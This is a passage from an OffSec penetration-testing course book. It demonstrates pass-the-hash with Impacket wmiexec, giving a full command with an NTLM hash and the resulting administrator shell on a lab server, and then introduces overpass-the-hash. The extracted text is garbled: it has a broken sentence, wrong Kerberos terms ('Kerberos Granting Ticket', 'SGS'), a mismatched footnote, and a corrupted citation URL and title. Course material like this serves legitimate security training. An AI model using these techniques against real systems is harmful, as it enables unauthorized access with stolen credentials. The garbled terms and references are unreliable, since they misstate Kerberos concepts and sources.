# OffSec Penetration Testing with Kali Linux

administrative permissions. In other cases, this type of lateral movement typically requires administrative rights.

Note that PTH uses the NTLM hash legitimately. The vulnerability lies in the fact that we gained unauthorized access to the password hash of a local administrator.

To demonstrate this, we use wmiexec from the Impacket suite from our local Kali machine against going to invoke the command by passing the local administrator account on the hash we gathered in a previous Module and then defining the username with the target IP.

```
kali@kali:~ /usr/bin/impacket-wmiexec -hashes :2892D26CF84D7A0E2EB3B9F05C42E5
Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
```

```
[*] SMB2.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
```

```
FILES04
C:\>whoami
files04\administrator
```

> Listing 840 - Passing the hash using Impacket wmiexec

In this case, we used NTLM authentication to obtain code execution on the Windows 2022 server directly from Kali, armed with only the user's NTLM hash.

if the target was sitting behind a network that was not reachable through our initial compromised access, we could perform this very same attack by pivoting and proxying through the first host we learned in previous Modules.

This method works for Active Directory accounts and the built-in local administrator account. However, due to the 2014 security update,¹¹⁴⁹ this technique cannot be used to authenticate as any other local admin account.

# 23.1.4 Overpass the Hash

With the overpass¹¹⁵⁰ we can "over" abuse the NTLM user hash to gain a full Kerberos Granting Ticket (TGT). We then use the TGT to obtain a Ticket Granting Service (SGS).

To demonstrate this, let's assume we have compromised a workstation (or server) that jen has authenticated to. We'll also assume that the machine is now caching their credentials (and therefore, their NTLM password hash).

To simulate this cached credential, we will log in to the Windows 10 CLIENT76 machine as jen and run a process as jen, which prompts authentication.

> ¹⁴⁹ (Microsoft, 2022), https://support.microsoft.com/en-us/help/2871997/microsoft-advisory-update-to-improve-credentials-protection.

> ¹¹⁵⁰ (Skip Duckwall and Benjamin Derby, 2014), https://www.blackattack.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Gets-Don't-It-it.pdf [mithre].), (MITRE, 2022), https://attack.mitre.org/techniques/T1550/002/

PWK - © 2023 OffSec Services Limited. 786